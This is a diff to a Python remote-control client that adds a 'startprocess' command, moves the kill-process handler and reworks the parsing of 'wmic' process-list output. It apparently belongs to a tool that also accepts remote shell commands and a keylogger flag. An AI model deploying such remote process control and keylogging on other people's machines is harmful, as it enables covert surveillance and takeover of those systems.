@@ -106,6 +106,8 @@ class Client:
                     self.sendProcessList()
                 elif flag == 'killprocess':
                     self.getKillProcess()
+                elif flag == 'startprocess':
+                    self.getStartProcess()
                 elif flag == 'command':
                     self.getCommand()
                 elif flag == 'keylogger':
@@ -131,13 +133,23 @@ class Client:
         print(f'{self.addr} \tSent dump data. Size: {dump_size}')
 
     # cmd func
-    def getResultCMD(self, cmd):
-        data = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
-        result = []
+    def getResultCMD(self, cmd, headers):
+        lines = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
 
-        for line in data.stdout:
-            if line.rstrip():
-                result.append(list(filter(None, line.decode().rstrip().split('  '))))
+        firstLine = lines.stdout.readline().decode().rstrip()
+        align = []
+        for header in headers:
+            align.append(firstLine.find(header))
+        align.append(len(firstLine) + 1)
+        
+        result = []
+        for l in lines.stdout:
+            if l.rstrip():
+                line = l.decode().rstrip()
+                row = []
+                for i in range(len(align) - 1):
+                    row.append(line[align[i] : align[i + 1] - 1].rstrip())
+                result.append(row)
 
         return result
 
@@ -157,8 +169,32 @@ class Client:
         # for process in f.Win32_Process(["ProcessId", "Name", "ThreadCount"]):
         #     process_data.append([process.ProcessId, process.Name, process.ThreadCount])
 
-        process_data = self.getResultCMD('wmic process get description, processid, threadcount')[1:]
+        process_data = self.getResultCMD('wmic process get description, processid, threadcount', ['Description', 'ProcessId', 'ThreadCount'])
         self.sendDump(process_data)
+
+    # kill process func
+    def getKillProcess(self):
+        pid = int(self.buff.recv_until(self.DELIM).decode())
+        print(f'{self.addr} \tKILL PROCESS {pid}')
+
+        try:
+            os.kill(pid, 9)
+            self.buff.send('OK'.encode() + self.DELIM)
+        except:
+            print(f'{self.addr} \t\tErr: Unable to kill {pid}')
+            self.buff.send('ER'.encode() + self.DELIM)
+
+    # start process func
+    def getStartProcess(self):
+        name = self.buff.recv_until(self.DELIM).decode()
+        print(f'{self.addr} \tSTART PROCESS {name}')
+
+        try:
+            subprocess.Popen(name)
+            self.buff.send('OK'.encode() + self.DELIM)
+        except:
+            print(f'{self.addr} \t\tErr: Unable to start {name}')
+            self.buff.send('ER'.encode() + self.DELIM)
 
     # keylogger func
     def keylogger_Server(self):
@@ -203,14 +239,6 @@ class Client:
                 break
             
 
-    # kill process func
-    def getKillProcess(self):
-        pid = int(self.buff.recv_until(self.DELIM).decode())
-        print(f'KILL PROCESS {pid}')
-
-        try:
-            os.kill(pid, 9)
-        except:
-            print('\t Err: No process with uid exist')
+    
 
 
